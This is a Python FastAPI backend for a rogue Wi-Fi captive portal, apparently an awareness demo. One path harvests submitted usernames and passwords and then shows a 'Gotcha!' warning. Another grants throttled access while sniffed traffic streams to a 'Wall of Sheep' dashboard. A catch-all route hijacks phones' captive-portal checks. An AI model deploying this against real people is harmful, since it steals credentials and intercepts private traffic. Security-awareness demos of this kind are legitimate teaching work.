from fastapi import FastAPI, Form, Request, BackgroundTasks, WebSocket, WebSocketDisconnect
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from fastapi.middleware.cors import CORSMiddleware
import subprocess
import uvicorn
import logging
from typing import Set

from network import grant_internet_access, throttle_bandwidth, deny_internet_access
from sniffer import start_sniffer, connected_clients

# Initialize FastAPI
app = FastAPI(title="Freemium AP Backend")

# Mount static files directly so we can serve HTML/CSS/JS without extra setup 
app.mount("/static", StaticFiles(directory="static"), name="static")

# Setup CORS for development
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Temporary in-memory dictionary for captured credentials
# Using a dictionary indexed by ip/session could be useful
captured_creds = {}

@app.on_event("startup")
async def startup_event():
    """
    Starts the packet sniffer when the FastAPI server initializes.
    """
    logger.info("Initializing Backend Service")
    # Uncomment when testing on Kali VM as root
    # start_sniffer()

@app.get("/", response_class=RedirectResponse)
async def splash_page(request: Request):
    """
    Simulated splash page redirect for the Captive Portal.
    Redirects immediately to the static frontend HTML.
    """
    return "/static/index.html"

@app.post("/api/auth/premium", response_class=HTMLResponse)
async def premium_auth(request: Request, username: str = Form(...), password: str = Form(...)):
    """
    Path A - Phishing Trap (Premium Wi-Fi)
    Captures credentials, stores in RAM, denies internet.
    """
    client_ip = request.client.host
    
    # Store credentials in ephemeral RAM
    captured_creds[client_ip] = {"username": username, "password": password}
    logger.info(f"Captured credentials from {client_ip}")

    # Explicitly deny internet access
    deny_internet_access(client_ip)

    # Return Gotcha warning
    return """
    <html>
        <body>
            <h1>Gotcha!</h1>
            <p>This was a simulated social engineering trap. You traded your credentials for 'Premium' access, but your data was just compromised.</p>
            <p>Stay safe on public Wi-Fi!</p>
        </body>
    </html>
    """

@app.post("/api/auth/guest")
async def guest_auth(request: Request, background_tasks: BackgroundTasks):
    """
    Path B - Surveillance Trap (Guest Wi-Fi)
    Grants throttled internet access and begins sniffing traffic.
    """
    client_ip = request.client.host
    
    logger.info(f"Guest authenticated from {client_ip}. Granting restricted access.")

    # Action 1 (Routing)
    background_tasks.add_task(grant_internet_access, client_ip)
    
    # Action 2 (Throttle)
    background_tasks.add_task(throttle_bandwidth, client_ip, rate="1mbit")
    
    # Action 3 (Sniffing) is handled continuously in the background thread (started on startup)

    return {"status": "success", "message": "Welcome to Guest Wi-Fi. You are connected at 1Mbps."}

@app.websocket("/ws/traffic")
async def websocket_endpoint(websocket: WebSocket):
    """
    WebSocket endpoint for the "Wall of Sheep" dashboard UI.
    """
    await websocket.accept()
    connected_clients.add(websocket)
    logger.info("New WebSocket client connected to traffic stream.")
    
    try:
        while True:
            # We just wait for disconnect, the sniffer thread pushes data.
            await websocket.receive_text()
    except WebSocketDisconnect:
        connected_clients.remove(websocket)
        logger.info("WebSocket client disconnected.")

 

@app.api_route("/{path_name:path}", methods=["GET", "POST", "HEAD"])
async def catch_all(request: Request, path_name: str):
    """
    The ultimate Captive Portal Catch-All.
    Every phone asks for a different random URL to check for internet.
    This intercepts ALL of them and forces them to the splash page.
    """
    # If the phone is legitimately trying to load CSS/JS, let it.
    if path_name.startswith("static/"):
        return

    # If it's asking for ANYTHING else (like captive.apple.com/hotspot-detect.html)
    # Redirect it to our splash page so the portal pops up.
    logger.info(f"Intercepted captive portal check for: {request.url}")
    return RedirectResponse(url="/static/index.html")

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=8000, reload=True)